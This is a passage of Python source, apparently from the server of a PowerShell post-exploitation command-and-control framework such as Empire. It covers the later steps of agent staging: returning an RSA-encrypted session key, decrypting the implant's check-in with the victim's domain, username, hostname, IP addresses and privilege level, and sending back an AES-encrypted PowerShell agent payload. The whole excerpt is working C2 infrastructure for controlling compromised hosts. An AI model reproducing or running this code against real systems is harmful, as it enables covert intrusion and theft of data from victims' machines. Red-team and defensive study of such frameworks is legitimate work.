                    jitter = config[5]
                    profile = config[6]
                    killDate = config[7]
                    workingHours = config[8]
                    lostLimit = config[11]

                    # add the agent to the database now that it's "checked in"
                    self.add_agent(sessionID, clientIP, delay, jitter, profile, killDate, workingHours,lostLimit)

                    # step 4 of negotiation -> return epoch+aes_session_key
                    clientSessionKey = self.get_agent_session_key(sessionID)
                    data = str(epoch)+clientSessionKey
                    data = data.encode('ascii','ignore')

                    encryptedMsg = encryption.rsa_encrypt(rsaKey, data)

                    # return a 200/valid and encrypted stage to the agent
                    return (200, encryptedMsg)

                else:
                    dispatcher.send("[!] Agent "+str(sessionID)+" returned an invalid public key!", sender="Agents")
                    return (404, "")


        # step 5 of negotiation -> client posts sysinfo and requests agent
        elif resource.lstrip("/").split("?")[0] == self.stage2:

            if self.is_agent_present(sessionID):

                # if this is a hop.php relay
                if "?" in resource:
                    parts = resource.split("?")
                    if len(parts) == 2:
                        decoded = helpers.decode_base64(parts[1])

                        # get the staging key for the given listener, keyed by port
                        #   results: host,port,cert_path,staging_key,default_delay,default_jitter,default_profile,kill_date,working_hours,lost_limit 
                        config = self.listeners.get_staging_information(host=decoded)

                else:
                    config = self.listeners.get_staging_information(port=port)
                
                delay = config[4]
                jitter = config[5]
                profile = config[6]
                killDate = config[7]
                workingHours = config[8]
                lostLimit = config[11]

                # get the session key for the agent
                sessionKey = self.agents[sessionID][0]

                try:
                    # decrypt and parse the agent's sysinfo checkin
                    data = encryption.aes_decrypt(sessionKey, postData)

                    parts = data.split("|")

                    if len(parts) < 10:
                        dispatcher.send("[!] Agent "+str(sessionID)+" posted invalid sysinfo checkin format", sender="Agents")
                        # remove the agent from the cache/database
                        self.remove_agent(sessionID)
                        return (404, "")

                    listener = parts[0].encode('ascii','ignore')
                    domainname = parts[1].encode('ascii','ignore')
                    username = parts[2].encode('ascii','ignore')
                    hostname = parts[3].encode('ascii','ignore')
                    external_ip = clientIP.encode('ascii','ignore')
                    internal_ip = parts[4].encode('ascii','ignore')
                    os_details = parts[5].encode('ascii','ignore')
                    high_integrity = parts[6].encode('ascii','ignore')
                    process_name = parts[7].encode('ascii','ignore')
                    process_id = parts[8].encode('ascii','ignore')
                    ps_version = parts[9].encode('ascii','ignore')

                    if high_integrity == "True":
                        high_integrity = 1
                    else:
                        high_integrity = 0

                except:
                    # remove the agent from the cache/database
                    self.remove_agent(sessionID)
                    return (404, "")                    

                # let everyone know an agent got stage2
                if self.args and self.args.debug:
                    dispatcher.send("[*] Sending agent (stage 2) to "+str(sessionID)+" at "+clientIP, sender="Agents")

                # step 6 of negotiation -> server sends patched agent.ps1
                agentCode = self.stagers.generate_agent(delay, jitter, profile, killDate,workingHours,lostLimit)

                username = str(domainname)+"\\"+str(username)

                # update the agent with this new information
                self.update_agent_sysinfo(sessionID, listener=listener, internal_ip=internal_ip, username=username, hostname=hostname, os_details=os_details, high_integrity=high_integrity, process_name=process_name, process_id=process_id, ps_version=ps_version)

                # encrypt the agent and send it back
                encryptedAgent = encryption.aes_encrypt(sessionKey, agentCode)

                # signal everyone that this agent is now active
                dispatcher.send("[+] Initial agent "+str(sessionID)+" from "+str(clientIP) + " now active", sender="Agents")
                output =  "[+] Agent " + str(sessionID) + " now active:\n"

                # set basic initial information to display for the agent
                agent = self.mainMenu.agents.get_agent(sessionID)

                keys = ["ID", "sessionID", "listener", "name", "delay", "jitter","external_ip", "internal_ip", "username", "high_integrity", "process_name", "process_id", "hostname", "os_details", "session_key", "checkin_time", "lastseen_time", "parent", "children", "servers", "uris", "old_uris", "user_agent", "headers", "functions", "kill_date", "working_hours", "ps_version", "lost_limit"]

                agentInfo = dict(zip(keys, agent))

                for key in agentInfo:
                    if key != "functions":
                        output += "  %s\t%s\n" % ('{0: <16}'.format(key), messages.wrap_string(agentInfo[key], width=70))

                # save the initial sysinfo information in the agent log
                self.save_agent_log(sessionID, output + "\n")

                return(200, encryptedAgent)

            else:
                dispatcher.send("[!] Agent "+str(sessionID)+" posted sysinfo without initial checkin", sender="Agents")
                return (404, "")

        # default behavior, 404
        else:
            return (404, "")

